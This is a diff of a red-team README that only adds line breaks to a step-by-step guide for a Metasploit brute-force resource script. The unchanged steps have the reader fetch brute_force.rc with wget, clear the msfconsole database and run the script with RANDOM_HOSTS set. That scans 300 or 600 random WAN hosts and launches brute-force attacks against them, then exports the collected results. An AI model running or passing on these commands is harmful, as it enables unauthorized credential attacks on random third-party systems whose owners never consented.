@@ -71,16 +71,16 @@
 
 #### Step-By-Step how to run brute_force.rc script
 
-- 1º download resource script to **/root** folder
+- 1º download resource script to **/root** folder<br />
 `sudo wget https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/brute_force.rc`
 
-- 2º start postgresql service (**local**)
+- 2º start postgresql service (**local**)<br />
 `sudo service postgresql start`
 
-- 3º clean msfconsole database before runing rc script
+- 3º clean msfconsole database before runing rc script<br />
 `sudo msfconsole -q -x 'hosts -d;services -d;exit -y'`
 
-- 4º run brute_force.rc resource script to search hosts on WAN
+- 4º run brute_force.rc resource script to search hosts on WAN<br />
 `sudo msfconsole -q -x 'setg RANDOM_HOSTS true;setg RANDOM 300;resource /root/brute_force.rc'`
 
 <br />
@@ -89,10 +89,10 @@ HINT: Brute force rc scripts requires the database to be empty, thats the reason
 cleans the database at exit, because at next time run if database contains any hosts, the script
 will run the attacks againts database hosts (old hosts) and not the hosts found by current scans.
 
-- 5º To populate the database with scans, just instruct the rc script to not clean db (optional)
+- 5º To populate the database with scans, just instruct the rc script to not clean db (optional)<br />
 `msfconsole -q -x 'seg CLEAN false;setg RANDOM_HOSTS true;setg RANDOM 600;resource /root/brute_force.rc'`
 
-- 6º export database contents to database.xml local folder (optional)
+- 6º export database contents to database.xml local folder (optional)<br />
 `msf > db_export -f xml database.xml`
 
 ### Suspicious Shell Activity RedTeam @2019
